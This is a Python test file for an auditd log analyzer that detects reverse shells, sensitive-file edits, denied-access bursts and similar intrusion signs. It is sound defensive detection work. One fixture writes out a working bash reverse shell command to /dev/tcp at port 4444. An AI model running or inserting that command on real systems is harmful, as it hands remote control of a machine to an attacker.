import json
import os
import subprocess
import sys

sys.path.insert(0, os.path.dirname(os.path.dirname(os.path.abspath(__file__))))
import auditd_analyzer as a

SAMPLE = os.path.join(os.path.dirname(os.path.dirname(os.path.abspath(__file__))), "samples", "audit.log")


def make_log(tmp_path, lines):
    p = tmp_path / "audit.log"
    p.write_text("\n".join(lines) + "\n")
    return str(p)


def test_unquote():
    assert a.unquote('"abc"') == "abc"
    assert a.unquote("abc") == "abc"


def test_events_are_grouped_by_id(tmp_path):
    p = make_log(tmp_path, [
        'type=SYSCALL msg=audit(1732400000.100:5): success=yes exe="/usr/bin/ls" auid=1000',
        'type=EXECVE msg=audit(1732400000.100:5): argc=2 a0="ls" a1="-la"',
    ])
    events = a.read_events(p)
    assert len(events) == 1
    assert a.command_line(events[0]) == "ls -la"


def test_reverse_shell_found(tmp_path):
    p = make_log(tmp_path, [
        'type=SYSCALL msg=audit(1732400000.100:5): success=yes exe="/usr/bin/bash" auid=1001',
        'type=EXECVE msg=audit(1732400000.100:5): argc=3 a0="bash" a1="-c" a2="bash -i >& /dev/tcp/203.0.113.5/4444 0>&1"',
    ])
    alerts = a.analyze(a.read_events(p))
    assert alerts[0]["type"] == "Reverse shell"
    assert alerts[0]["mitre"] == "T1059.004"


def test_normal_commands_do_not_alert(tmp_path):
    p = make_log(tmp_path, [
        'type=SYSCALL msg=audit(1732400000.100:5): success=yes exe="/usr/bin/apt" auid=1000',
        'type=EXECVE msg=audit(1732400000.100:5): argc=2 a0="apt" a1="update"',
    ])
    assert a.analyze(a.read_events(p)) == []


def test_trusted_tool_can_change_passwd(tmp_path):
    p = make_log(tmp_path, [
        'type=SYSCALL msg=audit(1732400000.100:5): success=yes exe="/usr/sbin/usermod" auid=0 key="identity"',
        'type=PATH msg=audit(1732400000.100:5): item=0 name="/etc/passwd" nametype=NORMAL',
    ])
    assert a.analyze(a.read_events(p)) == []


def test_editor_changing_shadow_alerts(tmp_path):
    p = make_log(tmp_path, [
        'type=SYSCALL msg=audit(1732400000.100:5): success=yes exe="/usr/bin/vim.basic" auid=1001 key="identity"',
        'type=PATH msg=audit(1732400000.100:5): item=0 name="/etc/shadow" nametype=NORMAL',
    ])
    assert a.analyze(a.read_events(p))[0]["type"] == "Sensitive file changed"


def test_denied_limit(tmp_path):
    lines = []
    for i in range(6):
        lines.append('type=SYSCALL msg=audit(1732400000.100:%d): success=no exit=-13 exe="/usr/bin/cat" auid=1002' % (i + 1))
        lines.append('type=PATH msg=audit(1732400000.100:%d): item=0 name="/root/f%d" nametype=UNKNOWN' % (i + 1, i))
    p = make_log(tmp_path, lines)
    assert a.analyze(a.read_events(p), 5)[0]["type"] == "Many denied accesses"
    assert a.analyze(a.read_events(p), 10) == []


def test_sample_log():
    kinds = {x["type"] for x in a.analyze(a.read_events(SAMPLE))}
    assert {"Reverse shell", "Encoded command", "Download and run", "Run from temp folder",
            "Sensitive file changed", "New account", "Audit tampering", "Many denied accesses"} <= kinds


def test_cli_json_exit_code():
    script = os.path.join(os.path.dirname(SAMPLE), "..", "auditd_analyzer.py")
    r = subprocess.run([sys.executable, script, SAMPLE, "--json"], capture_output=True, text=True)
    assert r.returncode == 1
    assert len(json.loads(r.stdout)) == 9
